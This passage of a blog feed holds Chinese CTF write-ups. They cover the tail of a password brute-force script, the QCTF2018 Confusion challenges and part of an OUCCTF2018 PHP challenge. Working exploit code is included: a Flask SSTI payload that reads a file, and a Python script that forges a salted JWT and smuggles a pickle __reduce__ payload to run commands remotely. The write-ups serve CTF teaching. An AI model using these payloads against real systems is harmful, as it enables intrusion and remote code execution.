class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;[+] Find password [%s] of user [%s]&#x27;</span> % (data[<span class="string">&#x27;passWord&#x27;</span>], data[<span class="string">&#x27;mobileNum&#x27;</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;[-] Password not find.&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[*] Done.&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vulnerability </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> BruteForce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QCTF2018 Confusion Writeup</title>
      <link href="/2018/07/16/QCTF2018-Confusion-Writeup/"/>
      <url>/2018/07/16/QCTF2018-Confusion-Writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="Confusion1"><a href="#Confusion1" class="headerlink" title="Confusion1"></a>Confusion1</h1><p>一进来浏览网站发现什么也没有，两个页面 login.php 和 register.php 全是 404</p><blockquote><p>虽然题目描述里专门讲了不要使用扫描器，但是很多师傅还是非要用扫描器疯狂扫，比赛才刚开始 1 个小时日志就疯涨到了 200M，后面不得已鄙人才着急写了个封 IP 的脚本，但是可能规则有点严，误封了不少人的 IP，这都是后话了</p></blockquote><p>既然网站什么也没有，但是题目还是要做的，继续浏览网站，细心点的师傅可以发现在 404 页面里给了 flag 的路径</p><p><img src="/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715082911.png"></p><p>那么这个题的目的肯定就是要想办法读到 flag 文件，要读文件那就肯定要有用户输入，但是整个网站并没有可以和用户交互的地方，除了 404 页面 url 部分</p><p>有经验的师傅肯定做过其他比赛中有 404 页面 url 部分 SSTI 的题，这个题也是一样的，没有经验的萌新就只能一步步的试了，总之这个网站可以控制输出的地方只有 404 的 url</p><p><img src="/2018/07/16/QCTF2018-Confusion-Writeup/RZD@7C54NA5SQL42X.png"></p><p>所以这里存在 SSTI，之后照着思路往下走，不细心的师傅可能走 PHP 的 SSTI 了，因为整个站鄙人都伪装成了 Apache+PHP，其实整个站使用 Python flask 实现的，伪装的并不完美，如果师傅做题的时候不小心弄出个 500，可能就会暴露真实的服务</p><p>现在仔细看首页的那张图应该就能明白那张图片的意思了 2333333333</p><p><img src="/2018/07/16/QCTF2018-Confusion-Writeup/PythonVsPhp.png"></p><p>另外题目里对一些关键字做了过滤</p><p><img src="/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715084603.png"></p><p>用 request.args 绕过即可，payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[request.args.a][request.args.b][<span class="number">2</span>][request.args.c]()[<span class="number">40</span>](<span class="string">&#x27;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#x27;</span>)[request.args.d]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read</span><br></pre></td></tr></table></figure><p>另外题目里除了 flag，还给了一个 salt，也拿上，下一个题会用到</p><h1 id="Confusion2"><a href="#Confusion2" class="headerlink" title="Confusion2"></a>Confusion2</h1><p>这个题和 Confusion1 相比多了 login 和 register，所以肯定要用到注册和登录，另外题目描述里讲了</p><blockquote><p> I find something STRANGE when Alice said hello to me.</p></blockquote><p>登录成功之后首页刚好会出现一个”hello”+ 用户名</p><p><img src="/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715085755.png"></p><p>所以就需要关注这个 hello 是怎么来的。从注册到登录，抓个包发现 cookie 比较奇怪，除了 PHPSESSID（当然这是假的 23333）还有一个 token，经过分析发现这是一个 JWT</p><p><img src="/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715090215.png"></p><p>这并不是标准的 JWT, 是鄙人自己实现的一个（为了师傅们做题方便用的算法是 sha256），然后分析一下 payload 里是什么</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="string">&quot;O:4:\&quot;User\&quot;:2:&#123;s:9:\&quot;user_data\&quot;;s:59:\&quot;(lp1\nVsrpopty\np2\naS&#x27;0af1ebb83911a420f08e94e6028b93ad&#x27;\np3\na.\&quot;;&#125;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>很明显 data 是一个 PHP 的序列化字符串，这时候很多师傅可能就会开始怀疑了，这个网站到底是个 PHP 还是个 Python？接着分析下这个序列化字符串。</p><p>User 对象中有一个 user_data 的成员，值为<code>(lp1\nVsrpopty\np2\naS&#39;0af1ebb83911a420f08e94e6028b93ad&#39;\np3\na.</code>，有经验的师傅这时候就可以看出来这是一个 Python 序列化的字符串，而且这个字符串中出现了两个很突出的部分：登录的用户名和一串 hash，而这串 hash 就是用户名的 md5</p><p><img src="/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715091118.png"></p><p>把这个字符串手动在 python 里反序列化一下会发现这是一个列表，第一个元素是用户名，第二个元素是用户名的 md5</p><p><img src="/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715091600.png"></p><p>所以接下来就是利用 python 中 class 的__reduce__方法反序列化 RCE，但是首先要想办法绕过 JWT 的验证。前面已经知道 JWT 中的算法是 sha256，但是题目描述中说</p><blockquote><p>PS: Alice said she likes add salts when she was cooking.</p></blockquote><p>Hint 中也提到</p><blockquote><p>hint：Alice likes adding salt at the LAST.</p></blockquote><p>在加上 Confusion1 中拿到的 salt 到现在都没有用到，所以 sha256 中需要加上前一道题中拿到的 salt，根据 Hint 里提到的，salt 需要加在最后，这样就能绕过 JWT 的验证了。需要注意一下的是在使用 salt 的时候格式是<code>jwt_header + &#39;.&#39; + jwt_payload + salt</code>，可能很多人在 payload 和 salt 之间也多加了个点导致 JWT 一直过不去，鄙人的锅，很抱歉鄙人没有讲清楚导致很多师傅卡在这里了。另外需要注意就是 python 反序列化的 payload 放在 PHP 的序列化字符串中也要注意 PHP 序列化的格式，字符数量必须和前面的数字相等</p><p>最后在 opt 中找到 flag</p><p><img src="/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715092347.png"></p><p>附 exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> Cookie</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"><span class="keyword">import</span> MD5proof</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.name != <span class="string">&#x27;posix&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;This script must be run on Linux!&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line">url = <span class="string">&#x27;http://xxxx:xxxx/&#x27;</span></span><br><span class="line">md5proof = MD5proof.Md5Proof(<span class="number">0</span>, <span class="number">6</span>)</span><br><span class="line">SALT = <span class="string">&#x27;_Y0uW1llN3verKn0w1t_&#x27;</span></span><br><span class="line">username = <span class="string">&#x27;srpopty&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;srpopty&#x27;</span></span><br><span class="line">cmd = <span class="string">&#x27;ls&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_url_encode</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(text).replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;-&#x27;</span>).replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;_&#x27;</span>).replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_url_decode</span>(<span class="params">text</span>):</span><br><span class="line">    text = text.replace(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;+&#x27;</span>).replace(<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = base64.b64decode(text)</span><br><span class="line">        <span class="keyword">except</span> TypeError:</span><br><span class="line">            text += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PickleRce</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> commands.getoutput, (cmd,)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">username, password</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        verify = md5proof.Proof(re.findall(<span class="string">&#x27;\&#x27;\),0,6\) === \&#x27;(.*?)\&#x27;&lt;/span&gt;&#x27;</span>,</span><br><span class="line">                                           sess.get(url + <span class="string">&#x27;login.php&#x27;</span>, allow_redirects=<span class="literal">False</span>).content)[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(verify) &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="string">&#x27;*&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> verify:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password,</span><br><span class="line">        <span class="string">&#x27;verify&#x27;</span>: verify</span><br><span class="line">    &#125;</span><br><span class="line">    ret = sess.post(url + <span class="string">&#x27;register.php&#x27;</span>, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> ret.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;[!] Register failed!&#x27;</span></span><br><span class="line">        <span class="built_in">print</span> ret.content</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">username, password</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        verify = md5proof.Proof(re.findall(<span class="string">&#x27;\&#x27;\),0,6\) === \&#x27;(.*?)\&#x27;&lt;/span&gt;&#x27;</span>,</span><br><span class="line">                                           sess.get(url + <span class="string">&#x27;login.php&#x27;</span>, allow_redirects=<span class="literal">False</span>).content)[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(verify) &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="string">&#x27;*&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> verify:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password,</span><br><span class="line">        <span class="string">&#x27;verify&#x27;</span>: verify</span><br><span class="line">    &#125;</span><br><span class="line">    ret = sess.post(url + <span class="string">&#x27;login.php&#x27;</span>, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> ret.content:</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;[!] Login failed!&#x27;</span></span><br><span class="line">        <span class="built_in">print</span> ret.content</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_jwt</span>(<span class="params">kid, data</span>):</span><br><span class="line">    jwt_header = base64_url_encode(</span><br><span class="line">        <span class="string">&#x27;&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;sha256&quot;,&quot;kid&quot;:&quot;%d&quot;&#125;&#x27;</span> % kid)</span><br><span class="line">    jwt_payload = base64_url_encode(<span class="string">&#x27;&#123;&quot;data&quot;:&quot;%s&quot;&#125;&#x27;</span> % data)</span><br><span class="line">    jwt_signature = base64_url_encode(hashlib.sha256(</span><br><span class="line">        jwt_header + <span class="string">&#x27;.&#x27;</span> + jwt_payload + SALT).hexdigest())</span><br><span class="line">    <span class="keyword">return</span> jwt_header + <span class="string">&#x27;.&#x27;</span> + jwt_payload + <span class="string">&#x27;.&#x27;</span> + jwt_signature</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">serialize</span>():</span><br><span class="line">    payload = cPickle.dumps([PickleRce(), PickleRce()])</span><br><span class="line">    data = json.dumps(<span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:9:&quot;user_data&quot;;s:%d:&quot;%s&quot;;&#125;&#x27;</span> % (</span><br><span class="line">        <span class="built_in">len</span>(payload), payload))[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span> data</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> register(username, password) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">    login_result = login(username, password)</span><br><span class="line">    <span class="keyword">if</span> login_result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                cmd = raw_input(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">                cookies = login_result.cookies</span><br><span class="line">                <span class="comment"># print &#x27;[*] Old Cookie token: &#x27; + cookies[&#x27;token&#x27;]</span></span><br><span class="line">                jwt = create_jwt(<span class="built_in">int</span>(re.findall(<span class="string">&#x27;&quot;kid&quot;:&quot;(.*?)&quot;&#x27;</span>, base64_url_decode(</span><br><span class="line">                    login_result.cookies[<span class="string">&#x27;token&#x27;</span>].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]))[<span class="number">0</span>]), serialize())</span><br><span class="line">                new_token = Cookie.SimpleCookie().value_encode(jwt)[<span class="number">1</span>]</span><br><span class="line">                <span class="comment"># print &#x27;[*] New Cookie token: &#x27; + new_token</span></span><br><span class="line">                new_cookies = &#123;</span><br><span class="line">                    <span class="string">&#x27;PHPSESSID&#x27;</span>: cookies[<span class="string">&#x27;PHPSESSID&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;token&#x27;</span>: new_token</span><br><span class="line">                &#125;</span><br><span class="line">                ret = requests.get(url + <span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">                                   allow_redirects=<span class="literal">False</span>, cookies=new_cookies)</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;[*] RCE result: &#x27;</span> + re.findall(<span class="string">&#x27;&lt;p class=&quot;hello&quot;&gt;Hello ([\s\S]*?)&lt;/p&gt;&#x27;</span>, ret.content)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;\nExit.&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="结语"><a href="# 结语" class="headerlink" title="结语"></a>结语 </h1><p> 这次比赛的确很难受，题目里说了别用扫描器，还是有很多人疯狂扫，最后把容器都扫崩了。赶出来一个封 IP 的脚本，虽然限制了扫描器，但是规则可能有点严（感觉也可能是玄学因素。。。），一开始 3 秒钟 30 个包封 IP（这个的确鄙人也感觉太严格了），不少人被误封，后来改成 3 秒钟 50 个包，有些人说被误封了，最后 3 秒钟 80 个包还有说误封的。。。。到最后只能改成 1 秒 80 个包还是说有被误封的 - -！日志量太大也实在不好审日志，所以最后只能把所有 IP 都解封，解封没多久又有上扫描器的。。。。</p><p>另外在日志中也能看到有些搅屎棍，的确，不得不说国内 CTF 比赛的环境实在是太恶劣了，自己做完了的题不想让别人做，还是多去打打国外的比赛吧。最后的确鄙人也是太垃圾了，很抱歉没有给各位师傅创造一个良好的解题环境，以后鄙人一定更加努力！</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OUCCTF2018 Partial Writeup</title>
      <link href="/2018/06/11/OUCCTF2018-Partial-Writeup/"/>
      <url>/2018/06/11/OUCCTF2018-Partial-Writeup/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文中的 write up 仅包含鄙人负责的题目</p></blockquote><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Web-Sign-In"><a href="#Web-Sign-In" class="headerlink" title="Web Sign In"></a>Web Sign In</h2><blockquote><p>Find the first flag at this website :)<br>  Hint: Ctrl + U will take you enter into a new world!</p></blockquote><p>Ctrl + U 查看网站源码就能在最底下找到 flag</p><blockquote><p>flag{We1C0m3_7he_game!}</p></blockquote><hr><h2 id="Magic-Number"><a href="#Magic-Number" class="headerlink" title="Magic Number"></a>Magic Number</h2><blockquote><p>Give me the magic number and you can get flag.</p></blockquote><p>打开网页什么也没有，抓包在响应头中获得 Hint</p><blockquote><p>hint: ?source</p></blockquote><p>拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_error&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Do you know what it is doing?</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$n</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$n</span> = <span class="title function_ invoke__">strval</span>(<span class="variable">$n</span>);</span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$j</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$n</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$i</span> &lt; <span class="variable">$j</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$n</span>[<span class="variable">$i</span>] !== <span class="variable">$n</span>[<span class="variable">$j</span>])</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">        <span class="variable">$j</span>--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$request</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>([<span class="variable">$_GET</span>, <span class="variable">$_POST</span>] <span class="keyword">as</span> <span class="variable">$global_var</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$global_var</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$value</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="title function_ invoke__">is_string</span>(<span class="variable">$value</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$value</span>) &amp;&amp; <span class="variable">$request</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$request</span>[<span class="string">&quot;number&quot;</span>]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$request</span>[<span class="string">&quot;number&quot;</span>] != <span class="title function_ invoke__">intval</span>(<span class="variable">$request</span>[<span class="string">&quot;number&quot;</span>])) &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;Number must be integer!&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$request</span>[<span class="string">&quot;number&quot;</span>][<span class="number">0</span>] === <span class="string">&quot;+&quot;</span> || <span class="variable">$request</span>[<span class="string">&quot;number&quot;</span>][<span class="number">0</span>] === <span class="string">&quot;-&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;No symbol!&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$request</span>[<span class="string">&quot;number&quot;</span>]) != <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$request</span>[<span class="string">&quot;number&quot;</span>]))) &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;Do you know what is the palindrome number?&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$request</span>[<span class="string">&quot;number&quot;</span>])) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;You did not pass the check! Sorry I can not give you the flag.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable">$msg</span> = <span class="string">&quot;Here is your flag: &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;hint: ?source&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Enjoy yourself!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$msg</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>审计代码，首先对所有的 get 和 post 参数做了如下处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>([<span class="variable">$_GET</span>, <span class="variable">$_POST</span>] <span class="keyword">as</span> <span class="variable">$global_var</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$global_var</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$value</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="title function_ invoke__">is_string</span>(<span class="variable">$value</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$value</span>) &amp;&amp; <span class="variable">$request</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入的参数必须是字符串，且该字符串必须是数字，并且对字符串进行了转义处理，再向下看可以看到想拿到 flag 需要以下四个条件成立</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$request</span>[<span class="string">&quot;number&quot;</span>] == <span class="title function_ invoke__">intval</span>(<span class="variable">$request</span>[<span class="string">&quot;number&quot;</span>]) <span class="comment">// number 必须是数字</span></span><br><span class="line"><span class="variable">$request</span>[<span 